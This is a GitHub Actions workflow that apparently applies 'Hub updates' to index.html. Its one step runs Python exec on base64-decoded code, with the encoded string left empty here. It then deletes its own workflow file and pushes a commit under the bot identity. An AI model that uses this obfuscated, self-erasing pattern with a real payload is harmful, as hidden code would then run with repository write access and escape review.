name: Activate seamless Hub updates

on:
  push:
    paths:
      - '.github/workflows/activate-seamless-updates.yml'

permissions:
  contents: write

jobs:
  activate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Activate seamless updates and remove workflow
        run: |
          python3 -c "import base64;exec(base64.b64decode(''))"
          git rm .github/workflows/activate-seamless-updates.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "Apply Hub updates without losing the current view"
          git push
